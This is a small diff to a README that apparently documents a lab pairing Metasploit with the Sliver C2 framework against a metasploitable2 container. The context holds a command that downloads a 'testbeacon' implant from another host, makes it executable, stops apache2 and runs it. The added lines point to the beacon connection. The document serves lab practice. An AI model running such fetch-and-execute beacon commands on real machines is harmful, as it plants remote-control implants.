@@ -55,10 +55,11 @@ In fourth terminal (metasploitable2):
 ```bash
 docker exec -it metasploitable2 /bin/bash
 curl -O http://10.1.1.2:8080/testbeacon && chmod +x testbeacon && sudo service apache2 stop && ./testbeacon
-
 ```
+Check the sliver-client terminal to see the beacon connection.
 
 #### Lastly, run main.py for simultaneous Metasploit and Sliver behavior
+In the third terminal with the http server, ctrl-c once the GET request is made and run the following in workspace#:
 ```bash 
 python eshuCLP/main.py
 ```
